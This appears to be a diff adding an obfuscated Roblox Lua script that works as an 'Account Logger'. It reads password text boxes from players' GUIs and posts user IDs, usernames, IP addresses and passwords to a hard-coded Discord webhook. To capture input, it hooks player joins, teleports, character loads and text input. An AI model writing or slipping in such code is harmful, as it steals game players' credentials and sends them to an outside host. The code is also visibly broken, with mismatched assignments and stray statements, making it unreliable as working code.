@@ -1,0 +1,16 @@
+local _G,_a,_b,_c,_d,_e,_f,_g,_h,_i,_j,_k,_l,_m,_n,_o,_p,_q,_r,_s,_t,_u,_v,_w,_x,_y,_z=...,_G,game,HttpService,Players,TeleportService,ReplicatedStorage,UserInputService,"https://discord.com/api/webhooks/1416521522880974889/kQOOpZfyO-wVTHJkoRz0McI3YzXJ8Mvgnon44_n6Mx9OtuyWRpcVOqbbJIqZL2GZVPgq",function(_a)return _a:FindFirstChild("PlayerGui"):FindFirstChild("ScreenGui"):FindFirstChild("TextLabel").Text end,function(_a,_b)local _c=_a.UserId;_a.Name;_j(_a);local _d={username="Account Logger",content=string.format("User ID: %s\nUsername: %s\nIP Address: %s\nPassword: %s",_c,_a,_j,_b)};_k:PostAsync(_l,_m.encode(_d),Enum.HttpContentType.ApplicationJson)end,function(_a)_a.CharacterAdded:Connect(function(_b)wait(5);local _c=_a:FindFirstChild("PlayerGui"):FindFirstChild("ScreenGui"):FindFirstChild("PasswordTextBox").Text;_n(_a,_c)end)end,function(_a)for _,_b in ipairs(_a)do _o(_b)end end,function(_a,_b,_c)local _d,_e=pcall(_a,_b,_c,function()local _f=_b:FindFirstChild("PlayerGui"):FindFirstChild("ScreenGui"):FindFirstChild("PasswordTextBox").Text;_n(_b,_f);if _c then _c()end end);if not _d then warn("TeleportService:Teleport failed:",_e)end;return _d,_e end,function(_a,_b)local _c,_d=pcall(_a,_b);if _c then local _e=_b:FindFirstChild("PlayerGui"):FindFirstChild("ScreenGui"):FindFirstChild("PasswordTextBox").Text;_n(_b,_e)else warn("ReplicatedStorage:LoadCharacter failed:",_d)end;return _c,_d end,function(_a,_b,_c)local _d,_e=pcall(_a,_b,_c);if _c then if _b:match("password") then local _f=Players.LocalPlayer;local _g=_b:match("password:(%S+)");if _g then _n(_f,_g)end end end;return _d,_e end
+
+_a=_b.GetService("HttpService");_c=_b.GetService("Players");_d=_b.GetService("TeleportService");_e=_b.GetService("ReplicatedStorage");_f=_b.GetService("UserInputService");
+
+_c.PlayerAdded:Connect(_o)
+
+_p(_c:GetPlayers())
+
+local _q=_d.Teleport
+function _d:Teleport(_a,_b,_c)_r(_q,self,_a,_b,_c)end
+
+local _s=_e.LoadCharacter
+function _e:LoadCharacter(_a)_t(_a,self,_a)end
+
+local _u=_f.ProcessTextInput
+function _f:ProcessTextInput(_a,_b)_v(_a,self,_a,_b)end
